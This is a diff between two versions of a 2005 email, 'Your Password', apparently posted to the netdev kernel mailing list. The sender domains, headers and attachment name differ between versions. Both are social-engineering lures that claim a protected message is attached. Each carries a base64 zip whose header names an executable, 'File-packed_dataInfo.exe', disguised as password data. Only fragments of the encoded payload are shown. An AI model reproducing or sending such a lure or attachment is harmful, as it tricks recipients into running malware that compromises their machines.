@@ -1,29 +1,29 @@
-From: webmaster@kanbay.com
+From: hostmaster@si.com
 Subject: Your Password
-Date: Thu, 15 Dec 2005 18:37:13 GMT
-Message-ID: <f0aceedadcec.b6b59fd@kanbay.com>
+Date: Thu, 15 Dec 2005 20:51:23 GMT
+Message-ID: <c16abeeb8186cc83@si.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===a7d12622ae84.bacd42b"
+Content-Type: multipart/mixed; boundary="======6b8ffc0ac3.c5"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: Z-User99@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===a7d12622ae84.bacd42b
+--======6b8ffc0ac3.c5
 
 Protected message is attached!
 
 
-***** Go to: http://www.kanbay.com
-***** Email: postman@kanbay.com
---===a7d12622ae84.bacd42b
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+***** Go to: http://www.si.com
+***** Email: postman@si.com
+--======6b8ffc0ac3.c5
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===a7d12622ae84.bacd42b--
+--======6b8ffc0ac3.c5--
